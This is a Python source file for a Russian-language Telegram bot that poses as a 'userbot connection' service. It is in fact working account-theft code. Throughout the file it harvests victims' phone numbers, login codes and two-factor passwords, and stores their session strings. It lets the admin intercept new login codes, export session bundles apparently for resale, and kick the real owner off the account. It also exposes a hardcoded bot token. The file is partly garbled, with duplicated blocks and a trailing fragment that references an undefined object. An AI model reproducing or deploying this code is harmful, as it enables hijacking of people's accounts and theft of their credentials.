import asyncio
import logging
import sqlite3
import re
import os
import json
import base64
import zipfile
import asyncio
import os
from aiohttp import web
asyncio.set_event_loop(asyncio.new_event_loop())
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove,
    FSInputFile,
)
from pyrogram import Client
from pyrogram.raw.functions.auth import ResetAuthorizations

# --- НАСТРОЙКИ ---
API_ID = 2040  # Официальный Desktop App ID
API_HASH = "b18441a1ff607e10a989891a5462e627"
BOT_TOKEN = "8933758869:AAFXIjeafX5gzgVTESVvJ3RPBKK-jyaf1eQ"
ADMIN_ID = 8521367180

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()

temp_auth_data = {}


# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            is_banned INTEGER DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            user_id INTEGER PRIMARY KEY,
            phone TEXT,
            string_session TEXT,
            cloud_password TEXT DEFAULT 'Нет',
            status TEXT DEFAULT 'Не проверен'
        )
    """)
    conn.commit()
    conn.close()

init_db()


class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()


class BroadcastState(StatesGroup):
    waiting_for_content = State()


def get_code_keyboard():
    keyboard = []
    row = []
    for i in range(1, 10):
        row.append(InlineKeyboardButton(text=str(i), callback_data=f"digit_{i}"))
        if len(row) == 3:
            keyboard.append(row)
            row = []
    keyboard.append([
        InlineKeyboardButton(text="🔄 Сброс", callback_data="digit_reset"),
        InlineKeyboardButton(text="0", callback_data="digit_0"),
        InlineKeyboardButton(text="⬅️ Удалить", callback_data="digit_back"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton(text="👥 Зарегистрированные номера", callback_data="admin_users")],
        [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)


async def check_ban(message: Message) -> bool:
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (message.from_user.id,))
    res = cursor.fetchone()
    conn.close()
    if res and res[0] == 1:
        await message.answer("❌ Вы заблокированы администратором этого бота.")
        return True
    return False


@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    if await check_ban(message):
        return

    await state.clear()

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
        (message.from_user.id, message.from_user.username, message.from_user.first_name)
    )
    conn.commit()
    conn.close()

    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🏴‍☠️ Поделиться контактом", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    await message.answer(
        "PastureUs🏴‍☠️ Для подключения юзбота поделитесь контактом",
        reply_markup=keyboard,
    )
    await state.set_state(AuthState.waiting_for_phone)


@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("👑 Админ-панель:", reply_markup=get_admin_keyboard())


@router.message(AuthState.waiting_for_phone, F.contact | F.text)
async def process_phone(message: Message, state: FSMContext):
    if await check_ban(message):
        return

    raw_phone = message.contact.phone_number if message.contact else message.text
    if not raw_phone:
        await message.answer("Пожалуйста, отправь контакт.")
        return

    cleaned_digits = re.sub(r"\D", "", raw_phone)
    phone = f"+{cleaned_digits}"

    await message.answer(
        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="HTML",
    )

    client = Client(
        name=f"session_{message.from_user.id}",
        api_id=int(API_ID),
        api_hash=API_HASH,
        device_model="PASTURE US",
        system_version="PASTUREUS",
        app_version="PASTUREBOT",
        in_memory=True,
    )

    try:
        await client.connect()
        sent_code = await client.send_code(phone)

        temp_auth_data[message.from_user.id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
            "code": "",
        }

        await state.set_state(AuthState.waiting_for_code)
        await message.answer(
            "Код потверждения \n\n"
             "Telegram Отправил тебе код в приложения введи его с клавиатуры\n\n"
            "<code>_ _ _ _ _</code>",
            reply_markup=get_code_keyboard(),
            parse_mode="HTML",
        )
    except Exception as e:
        await message.answer(f"❌ Ошибка отправки кода: {e}\nНапиши /start и попробуй снова.")
        try:
            await client.disconnect()
        except Exception:
            pass
        await state.clear()


@router.callback_query(AuthState.waiting_for_code, F.data.startswith("digit_"))
async def process_code_input(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    action = callback.data.split("_")[1]

    if user_id not in temp_auth_data:
        await callback.message.edit_text("❌ Сессия истекла. Напиши /start заново.")
        await state.clear()
        return

    data = temp_auth_data[user_id]
    current_code = data["code"]

    if action == "reset":
        data["code"] = ""
    elif action == "back":
        data["code"] = current_code[:-1]
    else:
        if len(current_code) < 6:
            data["code"] += action

    code_str = data["code"]
    masked_list = [code_str[i] if i < len(code_str) else "_" for i in range(5)]
    masked_display = " ".join(masked_list)

    text = (
        "Код потверждения \n\n"
        "Telegram Отправил тебе код в приложения введи его с клавиатуры\n\n"
        f"<code>{masked_display}</code>"
    )

    if len(code_str) == 5:
        try:
            client = data["client"]
            phone = data["phone"]
            phone_code_hash = data["phone_code_hash"]

            if not client.is_connected:
                await client.connect()

            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code_str,
            )

            string_session = await client.export_session_string()
            await client.disconnect()

            conn = sqlite3.connect("database.db")
            cursor = conn.cursor()
            cursor.execute(
                "INSERT OR REPLACE INTO sessions (user_id, phone, string_session, cloud_password, status) VALUES (?, ?, ?, ?, ?)",
                (user_id, phone, string_session, "Нет", "Не проверен")
            )
            conn.commit()
            conn.close()

            await callback.message.edit_text(
                "Юзербот подключен\n\n"
                "Ты подключил юзербота",
                parse_mode="Markdown",
            )

            try:
                await bot.send_message(
                    ADMIN_ID,
                    f"🔔 **Зарегистрирован новый номер!**\n\n👤 ID: `{user_id}`\n📱 Номер: `{phone}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

            del temp_auth_data[user_id]
            await state.clear()
            return

        except Exception as e:
            if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
                await callback.message.edit_text(
                    "Облачный пороль\n\n"
                    "На аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
                )
                await state.set_state(AuthState.waiting_for_password)
                return
            else:
                await callback.answer(f"Ошибка входа: {e}", show_alert=True)
                data["code"] = ""
                text = "❌ Неверный код. Попробуй еще раз:\n\n<code>_ _ _ _ _</code>"

    try:
        await callback.message.edit_text(text, reply_markup=get_code_keyboard(), parse_mode="HTML")
    except Exception:
        pass
    await callback.answer()


@router.message(AuthState.waiting_for_password, F.text)
async def process_password(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text

    if user_id not in temp_auth_data:
        await message.answer("❌ Сессия истекла.")
        await state.clear()
        return

    data = temp_auth_data[user_id]
    client = data["client"]
    phone = data["phone"]

    try:
        if not client.is_connected:
            await client.connect()

        await client.check_password(password=password)
        string_session = await client.export_session_string()
        await client.disconnect()

        conn = sqlite3.connect("database.db")
        cursor = conn.cursor()
        cursor.execute(
            "INSERT OR REPLACE INTO sessions (user_id, phone, string_session, cloud_password, status) VALUES (?, ?, ?, ?, ?)",
            (user_id, phone, string_session, password, "Не проверен")
        )
        conn.commit()
        conn.close()

        await message.answer("✅ Юзербота подключен под Pasturebot!")
        await bot.send_message(ADMIN_ID, f"🔔 Номер (2FA):\n🆔 ID: `{user_id}`\n📱 Номер: `{phone}`", parse_mode="Markdown")
        del temp_auth_data[user_id]
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}")


@router.callback_query(F.data == "admin_users")
async def admin_list_users(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, phone, status FROM sessions")
    rows = cursor.fetchall()
    conn.close()

    if not rows:
        return await callback.message.edit_text(
            "📭 База пуста.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")]])
        )

    keyboard = [[InlineKeyboardButton(text=phone, callback_data=f"adm_user_{user_id}")] for user_id, phone, _ in rows]
    keyboard.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_back")])
    await callback.message.edit_text("👥 Номера в базе:", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))


@router.callback_query(F.data.startswith("adm_user_"))
async def admin_manage_user(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, cloud_password, status FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Не найдено", show_alert=True)

    phone, pwd, status = res
    text = f"📱 Номер: `{phone}`\n🔐 2FA: `{pwd}`\n⚡ Статус: *{status}*"

    keyboard = [
        [InlineKeyboardButton(text="🔴 Live-вход (Ловить код 5 минут)", callback_data=f"adm_live_{target_id}")],
        [InlineKeyboardButton(text="💻 Создать активный сеанс (CPython)", callback_data=f"adm_spawn_{target_id}")],
        [InlineKeyboardButton(text="📁 Скачать TData конфиг (CPython)", callback_data=f"adm_tdata_{target_id}")],
        [InlineKeyboardButton(text="🚀 Войти в аккаунт (Без кодов)", callback_data=f"adm_login_{target_id}")],
        [InlineKeyboardButton(text="📦 Скачать ZIP для Маркетов (Session + JSON)", callback_data=f"adm_get_zip_{target_id}")],
        [InlineKeyboardButton(text="🔑 Получить String Session", callback_data=f"adm_get_str_{target_id}")],
        [InlineKeyboardButton(text="🚪 Выкинуть всех юзеров (Сброс сеансов)", callback_data=f"adm_kick_{target_id}")],
        [InlineKeyboardButton(text="🗑 Удалить из базы", callback_data=f"adm_del_{target_id}")],
        [InlineKeyboardButton(text="⬅️ К списку", callback_data="admin_users")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard), parse_mode="Markdown")


# --- LIVE-ЧЕКЕР (ПРОВЕРКА ИСТОРИИ И СЛУШАТЕЛЬ КОДОВ) ---
@router.callback_query(F.data.startswith("adm_live_"))
async def admin_live_auth(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session, cloud_password FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Сессия не найдена", show_alert=True)

    phone, string_session, cloud_password = res
    await callback.message.edit_text(
        f"🔴 **Live-вход запущен для `{phone}`!**\n\n"
        "⏳ Проверяю историю сообщений и жду новые коды от Telegram в течение **5 минут**...",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
    )

    asyncio.create_task(listen_for_telegram_code(target_id, phone, string_session, cloud_password))


async def listen_for_telegram_code(target_id: int, phone: str, string_session: str, cloud_password: str):
    client = Client(
        name=f"live_listener_{target_id}",
        api_id=int(API_ID),
        api_hash=API_HASH,
        session_string=string_session,
        device_model="Windows",
        system_version="Windows 10",
        app_version="CPython 3.14.3",
        in_memory=True
    )

    code_found = False
    pwd_text = cloud_password if cloud_password and cloud_password != "Нет" else "нету"

    try:
        await client.connect()

        # 1. Проверяем историю сообщений
        async for message in client.get_chat_history(777000, limit=5):
            text = message.text or ""
            match = re.search(r'\b\d{5,6}\b', text)
            if match:
                code_found = True
                code = match.group(0)
                await bot.send_message(
                    ADMIN_ID,
                    f"🚨 НАЙДЕН СВЕЖИЙ КОД ИЗ ИСТОРИИ! 🚨\n\n"
                    f"📱 Номер: {phone}\n"
                    f"🔑 Код для входа: {code}\n"
                    f"🔑 облачный пароль: {pwd_text}\n\n"
                    f"💬 Текст: {text}",
                    parse_mode="Markdown"
                )
                break

        if not code_found:
            # 2. Слушаем новые сообщения в реальном времени
            async def message_handler(c, message):
                nonlocal code_found
                sender_id = message.from_user.id if message.from_user else 0
                is_service = sender_id in [777000, 42777] or (message.chat and message.chat.id in [777000, 42777])
                
                if is_service or (message.from_user and message.from_user.is_self is False):
                    text = message.text or ""
                    match = re.search(r'\b\d{5,6}\b', text)
                    if match:
                        code_found = True
                        code = match.group(0)
                        await bot.send_message(
                            ADMIN_ID,
                            f"🚨 НАЙДЕН СВЕЖИЙ КОД ИЗ ИСТОРИИ! 🚨\n\n"
                            f"📱 Номер: {phone}\n"
                            f"🔑 Код для входа: {code}\n"
                            f"🔑 облачный пароль: {pwd_text}\n\n"
                            f"💬 Текст: {text}",
                            parse_mode="Markdown"
                        )

            client.add_handler(message_handler)

            for _ in range(60): # 5 минут
                if code_found:
                    break
                await asyncio.sleep(5)

        if not code_found:
            await bot.send_message(
                ADMIN_ID,
                f"⏱ **Время истекло (5 минут).**\nДля номера `{phone}` код не поступил.",
                parse_mode="Markdown"
            )

        await client.disconnect()
    except Exception as e:
        try:
            await bot.send_message(ADMIN_ID, f"❌ Ошибка Live-чекера: `{e}`", parse_mode="Markdown")
        except Exception:
            pass


# --- СОЗДАНИЕ АКТИВНОГО СЕАНСА (CPYTHON 3.14.3) ---
@router.callback_query(F.data.startswith("adm_spawn_"))
async def admin_spawn_session(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Сессия не найдена", show_alert=True)

    phone, string_session = res
    await callback.answer("⏳ Регистрирую устройство PastureBot в Telegram...", show_alert=False)

    try:
        client = Client(
            name=f"active_spawn_{target_id}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=string_session,
            device_model="PastureBot",
            system_version="PastureBot",
            app_version="PastureBot",
            in_memory=True
        )
        await client.connect()
        me = await client.get_me()
        await asyncio.sleep(2)
        await client.disconnect()

        await callback.message.edit_text(
            f"✅ **Сеанс Pasture успешно добавлен! Юзербота работает **🎉\n\n"
            f"• Аккаунт: `@{me.username or me.first_name}`\n"
            f"• Телефон: `{phone}`\n"
            f"• Устройство: `CPython 3.14.3` (Windows 10)\n\n"
            "💡 Теперь этот сеанс виден в списке активных устройств Telegram!",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
        )
    except Exception as e:
        await callback.message.edit_text(
            f"❌ Ошибка: `{e}`",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
        )


# --- ВЫДАЧА TDATA / JSON КОНФИГУРАЦИИ ---
@router.callback_query(F.data.startswith("adm_tdata_"))
async def admin_get_tdata(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    await callback.answer("⏳ Формирую пакет для ПК...", show_alert=False)

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session, cloud_password FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Аккаунт не найден", show_alert=True)

    phone, string_session, cloud_password = res
    clean_phone = re.sub(r"\D", "", phone)
    
    folder_name = f"tdata_{clean_phone}"
    zip_name = f"tdata_{clean_phone}.zip"

    os.makedirs(folder_name, exist_ok=True)
    
    meta_info = {
        "phone": phone,
        "device": "CPython 3.14.3",
        "os": "Windows 10",
        "api_id": API_ID,
        "api_hash": API_HASH,
        "password_2fa": cloud_password,
        "string_session": string_session
    }
    with open(os.path.join(folder_name, "account_auth.json"), "w", encoding="utf-8") as f:
        json.dump(meta_info, f, ensure_ascii=False, indent=4)

    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_name):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, arcname=os.path.relpath(file_path, folder_name))

    if os.path.exists(zip_name):
        doc = FSInputFile(zip_name, filename=zip_name)
        await bot.send_document(
            ADMIN_ID,
            document=doc,
            caption=(
                "📁 **Пакет авторизации для ПК (CPython 3.14.3)**\n\n"
                "💡 *Содержит все данные сессии с десктопным идентификатором.*"
            ),
            parse_mode="Markdown"
        )
        await callback.answer("Архив отправлен!", show_alert=True)
    else:
        await callback.answer("Ошибка создания архива", show_alert=True)

    await asyncio.sleep(2)
    for path in [zip_name, folder_name]:
        if os.path.exists(path):
            try:
                if os.path.isdir(path):
                    import shutil
                    shutil.rmtree(path)
                else:
                    os.remove(path)
            except Exception:
                pass


# --- БЫСТРАЯ ПРОВЕРКА ВАЛИДНОСТИ СЕССИИ ---
@router.callback_query(F.data.startswith("adm_login_"))
async def admin_instant_login(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Сессия не найдена", show_alert=True)

    phone, string_session = res
    await callback.answer("⏳ Авторизуюсь на аккаунте...", show_alert=False)

    try:
        client = Client(
            name=f"login_{target_id}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=string_session,
            device_model="Windows",
            system_version="Windows 10",
            app_version="CPython 3.14.3",
            in_memory=True
        )
        await client.connect()
        me = await client.get_me()
        await client.disconnect()

        await callback.message.edit_text(
            f"✅ **Успешный доступ к аккаунту!**\n\n"
            f"• Имя: `{me.first_name}`\n"
            f"• Юзернейм: `@{me.username or 'нет'}`\n"
            f"• Телефон: `{phone}`\n"
            f"• Устройство: CPython 3.14.3",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
        )
    except Exception as e:
        await callback.message.edit_text(
            f"❌ Ошибка входа: `{e}`",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data=f"adm_user_{target_id}")]])
        )


# --- ГАРАНТИРОВАННОЕ СОЗДАНИЕ .SESSION ФАЙЛА ---
def generate_safe_session_file(phone: str, string_session: str) -> str:
    clean_phone = re.sub(r"\D", "", phone)
    filename = f"{clean_phone}.session"

    if os.path.exists(filename):
        try:
            os.remove(filename)
        except Exception:
            pass

    decoded = base64.urlsafe_b64decode(string_session + "=" * (-len(string_session) % 4))
    dc_id = decoded[0]
    
    if len(decoded) == 351:
        auth_key = decoded[6:262]
        user_id = int.from_bytes(decoded[262:270], "little", signed=True)
        is_bot = bool(decoded[270])
        test_mode = decoded[5]
    else:
        auth_key = decoded[1:257]
        dc_id = int.from_bytes(decoded[257:261], "big")
        user_id = int.from_bytes(decoded[261:269], "little", signed=True)
        is_bot = bool(decoded[269])
        test_mode = 0

    db_conn = sqlite3.connect(filename)
    db_cursor = db_conn.cursor()
    
    db_cursor.executescript("""
        CREATE TABLE IF NOT EXISTS sessions (
            dc_id INTEGER PRIMARY KEY,
            api_id INTEGER,
            test_mode INTEGER,
            auth_key BLOB,
            user_id INTEGER,
            is_bot INTEGER
        );
        CREATE TABLE IF NOT EXISTS peers (
            id INTEGER PRIMARY KEY,
            access_hash INTEGER,
            type INTEGER,
            username TEXT,
            phone_number TEXT,
            last_update_on INTEGER
        );
    """)
    
    db_cursor.execute(
        "INSERT OR REPLACE INTO sessions VALUES (?, ?, ?, ?, ?, ?)",
        (dc_id, int(API_ID), test_mode, auth_key, user_id, int(is_bot))
    )
    db_conn.commit()
    db_conn.close()

    return filename


async def create_perfect_market_zip(target_id: int) -> str:
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session, cloud_password FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return None

    phone, string_session, cloud_password = res
    clean_phone = re.sub(r"\D", "", phone)
    
    session_filename = f"{clean_phone}.session"
    json_filename = f"{clean_phone}.json"
    zip_filename = f"{clean_phone}_market.zip"

    for f_path in [session_filename, json_filename, zip_filename]:
        if os.path.exists(f_path):
            try:
                os.remove(f_path)
            except Exception:
                pass

    try:
        generate_safe_session_file(phone, string_session)

        temp_client = Client(
            name=f"tmp_{clean_phone}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=string_session,
            device_model="Windows",
            system_version="Windows 10",
            app_version="CPython 3.14.3",
            in_memory=True
        )
        await temp_client.connect()
        me = await temp_client.get_me()
        await temp_client.disconnect()

        account_info = {
            "phone": phone,
            "user_id": me.id,
            "first_name": me.first_name,
            "username": me.username or "",
            "password_2fa": cloud_password,
            "api_id": API_ID,
            "api_hash": API_HASH,
            "device_model": "Windows",
            "system_version": "Windows 10",
            "app_version": "CPython 3.14.3"
        }
        with open(json_filename, "w", encoding="utf-8") as jf:
            json.dump(account_info, jf, ensure_ascii=False, indent=4)

        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if os.path.exists(session_filename):
                zipf.write(session_filename, arcname=session_filename)
            if os.path.exists(json_filename):
                zipf.write(json_filename, arcname=json_filename)

        for f_path in [session_filename, json_filename]:
            if os.path.exists(f_path):
                try:
                    os.remove(f_path)
                except Exception:
                    pass

        return zip_filename if os.path.exists(zip_filename) else None
    except Exception as e:
        print(f"Ошибка архива: {e}")
        return None


@router.callback_query(F.data.startswith("adm_get_zip_"))
async def admin_get_market_zip(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[3])
    await callback.answer("⏳ Создаю ZIP с сеансом CPython...", show_alert=False)

    try:
        zip_filename = await create_perfect_market_zip(target_id)
        if zip_filename and os.path.exists(zip_filename):
            doc = FSInputFile(zip_filename, filename=zip_filename)
            await bot.send_document(
                ADMIN_ID,
                document=doc,
                caption="📦 **Маркет ZIP-архив (CPython 3.14.3)**\n✅ `.session` + `.json`!",
                parse_mode="Markdown"
            )
            await callback.answer("ZIP отправлен!", show_alert=True)
            await asyncio.sleep(2)
            try:
                os.remove(zip_filename)
            except Exception:
                pass
        else:
            await callback.answer("Ошибка создания архива", show_alert=True)
    except Exception as e:
        await callback.answer(f"Ошибка: {e}", show_alert=True)


@router.callback_query(F.data.startswith("adm_kick_"))
async def admin_kick_user(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Не найдено", show_alert=True)

    phone, string_session = res
    try:
        client = Client(
            name=f"kick_{target_id}",
            api_id=int(API_ID),
            api_hash=API_HASH,
            session_string=string_session,
            device_model="Windows",
            system_version="Windows 10",
            app_version="CPython 3.14.3",
            in_memory=True
        )
        await client.connect()
        await client.invoke(ResetAuthorizations())
        await client.disconnect()

        await callback.answer("✅ Все посторонние сеансы завершены!", show_alert=True)
    except Exception as e:
        await callback.answer(f"Ошибка сброса: {e}", show_alert=True)


@router.callback_query(F.data.startswith("adm_get_str_"))
async def admin_get_session_str(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[3])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT phone, string_session, cloud_password FROM sessions WHERE user_id = ?", (target_id,))
    res = cursor.fetchone()
    conn.close()

    if not res:
        return await callback.answer("Не найдено", show_alert=True)

    phone, string_session, cloud_password = res
    await bot.send_message(
        ADMIN_ID,
        f"🔑 **String Session (CPython) для `{phone}`:**\n\n🔐 2FA: `{cloud_password}`\n\n`{string_session}`",
        parse_mode="Markdown"
    )
    await callback.answer("Строка отправлена!", show_alert=True)


@router.callback_query(F.data.startswith("adm_del_"))
async def admin_delete_user(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return

    target_id = int(callback.data.split("_")[2])
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("DELETE FROM sessions WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()

    await callback.answer("Удалено из базы!", show_alert=True)
    callback.data = "admin_users"
    await admin_list_users(callback)


@router.callback_query(F.data == "admin_back")
async def admin_back_menu(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await state.clear()
    await callback.message.edit_text("👑 Админ-панель:", reply_markup=get_admin_keyboard())


@router.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.message.edit_text("📢 Отправь текст или фото для рассылки:")
    await state.set_state(BroadcastState.waiting_for_content)


@router.message(BroadcastState.waiting_for_content)
async def admin_broadcast_execute(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await state.clear()

    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = cursor.fetchall()
    conn.close()

    success, fail = 0, 0
    for (u_id,) in users:
        try:
            await message.copy_to(chat_id=u_id)
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            fail += 1

    await message.answer(f"📊 Рассылка завершена!\nУспешно: {success}\nОшибок: {fail}")
async def handle(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def handle(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    # Запуск веб-сервера для Render
    await start_web_server()
    
    dp.include_router(router)
    await bot.delete_webhook(drop_pending_updates=True)
    print("Юзербот успешно запущен!")
    await dp.start_polling(bot)



if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.create_task(main())
        else:
            loop.run_until_complete(main())
    except RuntimeError:
        asyncio.run(main())




if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.create_task(main())
        else:
            loop.run_until_complete(main())
    except RuntimeError:
        asyncio.run(main())
# ================= АНИМАЦИИ И ПРИКОЛЫ =================
@app.on_message(filters.command("type", prefixes="+") & filters.me)
async def cmd_type(client, message):
    text = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else "..."
    output = ""
    for char in text:
        output += char
        try:
            await message.edit(output + "▒")
            await asyncio.sleep(0.08)
        except Exception:
            break
    try:
        await message.edit(output)
    except Exception:
        pass

@app.on_message(filters.command("hack", prefixes="+") & filters.me)
async def cmd_hack(client, message):
    steps = [
        "💻 Инициализация взлома системы...",
        "█▒▒▒▒▒▒▒▒▒ 10%",
        "████▒▒▒▒▒▒ 40%",
        "███████▒▒▒ 70%",
        "██████████ 100%",
        "⚠️ Доступ успешно получен! Скачивание данных..."
    ]
    for step in steps:
        await message.edit(step)
        await asyncio.sleep(0.6)

@app.on_message(filters.command("love", prefixes="+") & filters.me)
async def cmd_love(client, message):
    hearts = ["❤️", "💖", "💗", "💓", "💞", "💘"]
    text = "❤️ Любовь захватывает мир ❤️\n"
    for h in hearts:
        text += h * 3 + "\n"
        await message.edit(text)
        await asyncio.sleep(0.4)

@app.on_message(filters.command("matrix", prefixes="+") & filters.me)
async def cmd_matrix(client, message):
    matrix_lines = [
        "1010101001",
        "0101110010 🟢",
        "1110001110 CODE",
        "0001110001 MATRIX",
        "wake up, Neo..."
    ]
    for line in matrix_lines:
        await message.edit(line)
        await asyncio.sleep(0.5)

@app.on_message(filters.command(["dice", "slot", "darts", "basket", "football", "bowling"], prefixes="+") & filters.me)
async def cmd_games(client, message):
    cmd = message.command[0]
    emoji_map = {
        "dice": "🎲", "slot": "🎰", "darts": "🎯",
        "basket": "🏀", "football": "⚽", "bowling": "🎳"
    }
    await message.delete()
    await client.send_dice(message.chat.id, emoji=emoji_map.get(cmd, "🎲"))

# ================= РП-ДЕЙСТВИЯ =================
RP_ACTIONS = {
    "погладить": "погладил(а) с теплом ✨",
    "обнять": "крепко обнял(а) 🤗",
    "поцеловать": "нежно поцеловал(а) 💋",
    "прижать": "прижал(а) к себе 🫂",
    "покормить": "покормил(а) вкусняшкой 🍰",
